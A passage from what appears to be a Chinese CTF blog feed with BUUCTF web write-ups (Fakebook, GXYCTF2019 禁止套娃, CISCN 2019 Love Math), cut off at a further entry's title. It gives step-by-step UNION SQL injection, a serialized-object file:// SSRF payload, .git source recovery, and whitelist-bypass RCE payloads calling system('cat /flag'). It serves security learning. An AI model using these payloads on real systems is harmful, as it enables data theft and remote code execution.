title="实操："></a>实操：</h5><p>我先继续爆破</p><p><img src="/2021/08/02/2021/ctf/6/image-20210803145941495.png" alt="image-20210803145941495"></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/ <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>(),3,4<span class="hljs-comment">#</span></span><br></code></pre></td></tr></table></figure><p>得到数据库名：fakebook</p><p><img src="/2021/08/02/2021/ctf/6/image-20210803151032215.png" alt="image-20210803151032215"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;fakebook&#x27;</span>#<br></code></pre></td></tr></table></figure><p>得到表名：users</p><p><img src="/2021/08/02/2021/ctf/6/image-20210803151215574.png" alt="image-20210803151215574"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#<br></code></pre></td></tr></table></figure><p>得到列名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</p><p><img src="/2021/08/02/2021/ctf/6/image-20210803151357937.png" alt="image-20210803151357937"></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/ <span class="hljs-title">select</span> 1,<span class="hljs-title">data</span>,3,4 <span class="hljs-title">from</span> <span class="hljs-title">users</span><span class="hljs-comment">#</span></span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">group_concat</span>(<span class="hljs-title">no</span>,<span class="hljs-title">username</span>,<span class="hljs-title">passwd</span>,<span class="hljs-title">data</span>),3,4 <span class="hljs-title">from</span> <span class="hljs-title">fakebook</span>.<span class="hljs-title">users</span><span class="hljs-comment">#</span></span><br></code></pre></td></tr></table></figure><p>当试到data时，出现了我们想要的部分序列化数据格式</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:1;s:4:”blog”;s:13:”<a href="http://www.baidu.com&quot;;}/">www.baidu.com&quot;;}</a>            </p><p>这时候回到源代码上</p><p>我们来一手反序列化操作：</p><p>注：文件路径是扫描到的。</p><p><img src="/2021/08/02/2021/ctf/6/image-20210803153246831.png" alt="image-20210803153246831"></p><p>在本地www访问fakebook.php</p><p><img src="/2021/08/02/2021/ctf/6/image-20210803153215829.png" alt="image-20210803153215829"></p><p>构造payload：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/ <span class="hljs-title">select</span> 1,2,3,&#x27;<span class="hljs-title">O</span>:8:&quot;<span class="hljs-title">UserInfo</span>&quot;:3:&#123;<span class="hljs-title">s</span>:4:&quot;<span class="hljs-title">name</span>&quot;;</span><span class="hljs-symbol">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<span class="hljs-symbol">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-symbol">i:</span><span class="hljs-number">1</span>;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-symbol">s:</span><span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/08/02/2021/ctf/6/image-20210803153757132.png" alt="image-20210803153757132"></p><p><img src="/2021/08/02/2021/ctf/6/image-20210803153814758.png" alt="image-20210803153814758"></p><p><img src="/2021/08/02/2021/ctf/6/image-20210803153834055.png" alt="image-20210803153834055"></p><p>本文借鉴几个大佬博客：</p><p><a href="https://blog.csdn.net/qq_43622442/article/details/105633194">网鼎杯 2018]Fakebook_H9_dawn的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/karsa/p/12652311.html">网鼎杯 2018]Fakebook - kar3a - 博客园 (cnblogs.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/1682583">网鼎杯2018-Fakebook - 云+社区 - 腾讯云 (tencent.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF·sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019 禁止套娃</title>
      <link href="/2021/08/01/2021/ctf/5/"/>
      <url>/2021/08/01/2021/ctf/5/</url>
      
        <content type="html"><![CDATA[<p> 知识点：命令执行绕过</p><p>靶机启动：</p><p><img src="/2021/08/01/2021/ctf/5/image-20210801193338875.png" alt="image-20210801193338875"></p><p>查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来</p><p>查看了wp才知道这是git泄露。</p><h3 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h3><h4 id="简述-git文件导致的源码泄露"><a href="#简述-git文件导致的源码泄露" class="headerlink" title="简述.git文件导致的源码泄露"></a>简述.git文件导致的源码泄露</h4><p>.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。</p><h4 id="原理利用"><a href="#原理利用" class="headerlink" title="原理利用"></a>原理利用</h4><p>1、通常开发人员在开发时，通常将源码提交到远程的托管网站（如Github）方便管理与交互，等到开发最后阶段，再将源码从远程服务器上下载到 web 目录下， 如果开发人员忘记将其中的 .git文件删除，则可以通过 .git文件恢复网站源码，来获取一些敏感信息；<br>2、开发人员对站点使用 Git 对版本进行控制，实现自动部署，如果配置不当，直接将 .git文件加载到线上环境，这样便引起了.git文件泄露。</p><p>这时候我们用了名为GitHack的工具</p><p>(需要python版本为2打头的，因为作者写的时候估计python解释器是参考python2的所以用python3会报错,下载地址为：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</p><p>进行了扫描，获取源文件：</p><p><img src="/2021/08/01/2021/ctf/5/image-20210801194006477.png" alt="image-20210801194006477"></p><p><img src="/2021/08/01/2021/ctf/5/image-20210801194541670.png" alt="image-20210801194541670"></p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们的最终目的就是绕过之后通过eval函数来查询flag。</p><p>源码分析：</p><ul><li>需要通过<strong>GET</strong>方式传入参数<code>exp</code></li><li>第一层<code>preg_match()</code>函数限制了php伪协议，像封装协议之类的</li><li>第二层<code>preg_replace()</code>正则表达式匹配，<code>(?R)</code>表示引用当前表达式，只能匹配通过无参数的函数。</li><li>第三层<code>preg_match()</code>限制了一些关键字</li><li><code>@eval($_GET[&#39;exp&#39;]);</code>可以进行命令执行；典型的无参数RCE</li><li>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</li></ul><p><img src="/2021/08/01/2021/ctf/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>第二层正则表达式无法给directory参数赋值，所以查找能够返回为’.’结果的函数；</p><p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>并且scandir返回的是一个数组</p><p>那么问题就是如何构造<br>scandir(‘.’)</p><p>这里再看函数：</p><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos()是 current() 的别名。<br>这里还有一个知识点：</p><p><strong>current(localeconv())永远都是个点</strong></p><p>构造：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">current</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span><br>print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/08/01/2021/ctf/5/image-20210801200909285.png" alt="image-20210801200909285"></p><p>到这里我们也只是可以知道flag.php的存在</p><p>却还不能读取它的源码</p><p><img src="/2021/08/01/2021/ctf/5/1625650-20200204202458447-503722062.png" alt="img"></p><p>从上图的官方解释中可以知道</p><p>我们无法用单独的函数读取源码</p><p><strong>1.array_reverse()</strong><br>以相反的元素顺序返回数组</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));<br></code></pre></td></tr></table></figure><p><strong>2.array_flip()</strong></p><p>交换数组的键和值</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));<br></code></pre></td></tr></table></figure><p><strong>3.array_rand()</strong></p><p>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br></code></pre></td></tr></table></figure><p>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">exp=print_r(<span class="hljs-name">readfile</span>(<span class="hljs-name">next</span>(<span class="hljs-name">array_reverse</span>(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">exp=highlight_file(<span class="hljs-name">next</span>(<span class="hljs-name">array_reverse</span>(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">exp=show_source(<span class="hljs-name">session_id</span>(<span class="hljs-name">session_start</span>()))<span class="hljs-comment">;    </span><br></code></pre></td></tr></table></figure><p><img src="/2021/08/01/2021/ctf/5/image-20210801202551668.png" alt="image-20210801202551668"></p><p>参考博客：</p><p> <a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p><p> <a href="https://blog.csdn.net/weixin_44037296/article/details/111404335">GXYCTF2019] 禁止套娃_Senimo-CSDN博客_buuctf 禁止套娃</a></p><p> <a href="https://blog.csdn.net/rfrder/article/details/109627827">GXYCTF2019]禁止套娃 1_feng的博客-CSDN博客</a></p><h4 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h4><p>学长用这题做模板，做了改造题</p><p>本来以为很简单(好吧其实是很简单)</p><p>先用</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">current</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/08/01/2021/ctf/5/image-20210827201807385.png" alt="image-20210827201807385"></p><p>再直接读取（我就是傻傻一直不读读取的孩子啊，在那array_reverse，哭死了）</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">show<span class="hljs-number">_</span>source(<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>real<span class="hljs-number">_f</span>lag);<br></code></pre></td></tr></table></figure><p><img src="/2021/08/01/2021/ctf/5/image-20210827201914618.png" alt="image-20210827201914618"></p>]]></content>
      
      
      <categories>
          
          <category> CTF·rce </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2019 初赛	Love Math</title>
      <link href="/2021/07/30/2021/ctf/4/"/>
      <url>/2021/07/30/2021/ctf/4/</url>
      
        <content type="html"><![CDATA[<p>​    这是一道非常好的绕过题目。</p><p><img src="/2021/07/30/2021/ctf/4/image-20210730151757624.png" alt="image-20210730151757624"></p><p>附上源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    $content = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    $blacklist = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/m&#x27;</span>, $content)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    $whitelist = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  <br>    <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) &#123;<br>        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.$content.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：白名单里有些函数</p><h5 id="base-convert函数"><a href="#base-convert函数" class="headerlink" title="base_convert函数"></a><strong>base_convert</strong>函数<img src="/2021/07/30/2021/ctf/4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc3NodDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></h5><h5 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h5><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p><h5 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex() 函数"></a>dechex() 函数</h5><p>dechex() 函数把十进制数转换为十六进制数。</p><p>目标：执行system函数来完成查看flag的操作。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure><p>但是上面列出来白名单和黑名单，关键字符会被过滤，要求我们绕过。</p><p>比如这样就是被过滤了：</p><p><img src="/2021/07/30/2021/ctf/4/image-20210802091253839.png" alt="image-20210802091253839"></p><p>我们不能输入引号和system函数</p><p>但引号去掉也可执行，然后再采用变量保存函数和参数。</p><p>且用白名单里的函数代替得</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">pi</span>])(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">abs</span>])&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure><p>不过，_GET并没有在白名单内,[ ]也被过滤。</p><p>所以</p><p>1.[ ]可以用{}替换</p><p>2._GET用hex2bin转换</p><p><a href="https://www.rapidtables.org/zh-CN/convert/number/ascii-to-hex.html">ASCII到十六进制| 文本到十六进制代码转换器 (rapidtables.org)</a></p><p><img src="/2021/07/30/2021/ctf/4/image-20210802092247741.png" alt="image-20210802092247741"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_GET</span>=hex<span class="hljs-number">2</span>bin(<span class="hljs-number">5</span>f <span class="hljs-number">47</span> <span class="hljs-number">45</span> <span class="hljs-number">54</span>)<br></code></pre></td></tr></table></figure><p>  这里用到的hex2bin也是名单之外</p><p>  需要用base_convert函数转换</p><p>（用base_convert()函数将10进制数转化为32进制的hex2bin）</p><p><a href="https://tool.oschina.net/hexconvert">在线进制转换 (oschina.net)</a></p><p><img src="/2021/07/30/2021/ctf/4/image-20210802092841841.png" alt="image-20210802092841841"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">hex2bin=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)<br></code></pre></td></tr></table></figure><p>数字也不能直接填</p><p>因为之前的正则表达式会过滤掉。</p><p><code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</code> 这句话当作函数名放进白名单里检测</p><p>所以<code>5f 47 45 54</code>需要转换</p><p>而dechex() 函数把十进制数转换为十六进制数。</p><p><img src="/2021/07/30/2021/ctf/4/image-20210802093324856.png" alt="image-20210802093324856"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">5f</span>474554=dechex(<span class="hljs-number">1598506324</span>)<br></code></pre></td></tr></table></figure><p>所以有：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_GET</span>=hex<span class="hljs-number">2</span>bin(<span class="hljs-number">5</span>f <span class="hljs-number">47</span> <span class="hljs-number">45</span> <span class="hljs-number">54</span>)=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>))<br></code></pre></td></tr></table></figure><p>接着将_GET存在一个变量里：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$pi=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));<br></code></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure><p><img src="/2021/07/30/2021/ctf/4/image-20210802094315328.png" alt="image-20210802094315328"></p><p>本文章参考于：(<a href="https://blog.csdn.net/missht0/article/details/113244707">https://blog.csdn.net/missht0/article/details/113244707</a>)</p>]]></content>
      
      
      <categories>
          
          <category> CTF·rce </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020 Blacklist</title>
      <link href="/2021/07/27/2021/ctf/3/"/>
      <url>/2021/07/27/2021/ctf/3/</url>
      
